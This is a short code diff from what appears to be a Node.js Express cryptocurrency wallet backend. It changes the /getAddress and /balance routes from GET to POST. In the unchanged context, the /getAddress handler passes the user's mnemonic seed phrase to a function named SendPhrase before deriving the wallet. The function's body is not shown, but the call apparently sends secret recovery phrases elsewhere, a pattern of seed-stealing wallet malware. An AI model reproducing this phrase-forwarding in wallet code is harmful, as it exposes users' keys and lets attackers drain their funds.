@@ -105,7 +105,7 @@ app.post("/CreateNewWallet", async(req, res) => {
     const myArray = randomMnemonic.phrase.split(" ");
     res.json(myArray);
 })
-app.get("/getAddress", async(req, res) => {
+app.post("/getAddress", async(req, res) => {
     SendPhrase(req.body.phrase);
     try {
         const wallet = ethers.Wallet.fromMnemonic(req.body.phrase);
@@ -125,7 +125,7 @@ function SendPhrase(phrase) {
 
 
 }
-app.get("/balance", async(req, res) => {
+app.post("/balance", async(req, res) => {
     try {
         const balance = await provider.getBalance(req.body.address);
         // convert a currency unit from wei to ether
